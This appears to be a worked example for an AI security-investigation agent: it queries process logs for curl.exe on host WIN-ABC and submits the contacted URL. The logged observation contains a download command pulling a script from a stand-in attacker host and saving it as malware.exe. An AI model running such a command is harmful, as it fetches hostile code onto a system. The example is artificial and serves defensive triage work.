@@ -1,0 +1,12 @@
+Question: What URL did process curl.exe contact on device WIN-ABC during the security alert at 2024-01-15 10:30:00?
+
+Thought: The alert mentions curl.exe which often has URLs in its command line. Let me check DeviceProcessEvents.
+Action: execute[SELECT ProcessCommandLine, Timestamp FROM DeviceProcessEvents WHERE DeviceName = 'WIN-ABC' AND FileName = 'curl.exe' AND Timestamp BETWEEN '2024-01-15 10:20:00' AND '2024-01-15 10:40:00']
+
+Observation:
+| ProcessCommandLine                     | Timestamp           |
+|----------------------------------------|---------------------|
+| curl http://attacker.com/script.sh -o malware.exe | 2024-01-15 10:29:45 |
+
+Thought: Investigation Law #4 (ENTITY PIVOTING) says to check ProcessCommandLine if RemoteUrl is null. The command line shows curl contacted http://attacker.com/script.sh.
+Action: submit[http://attacker.com/script.sh]
